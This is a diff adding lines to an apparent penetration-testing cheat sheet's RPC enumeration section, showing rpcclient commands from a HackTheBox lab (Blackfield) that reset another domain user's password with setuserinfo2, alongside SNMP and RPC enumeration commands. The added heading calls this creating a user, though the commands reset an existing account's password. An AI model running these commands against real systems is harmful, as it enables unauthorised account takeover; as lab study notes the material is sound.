@@ -1060,6 +1060,7 @@ snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports
 ```
 
 ## RPC Enumeration
+- Create a user using rpcclient
 
 ```powershell
 rpcclient -U=user $IP
@@ -1080,6 +1081,18 @@ querydispinfo #description of all users
 netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
 netshareenumall
 lsaenumsid #SID of all users
+# Create user using rpcclient
+rpcclient -U support 10.10.10.192 (Blackfield - HackTheBox)
+rpcclient $> setuserinfo2 audit2020 23 ashok
+result: NT_STATUS_PASSWORD_RESTRICTION
+result was NT_STATUS_PASSWORD_RESTRICTION
+#Error with the Password policy not match
+rpcclient $> setuserinfo2 audit2020 23 'Ashok@123'
+rpcclient $>
+# Password created successful
+
+
+
 ```
 
 ---
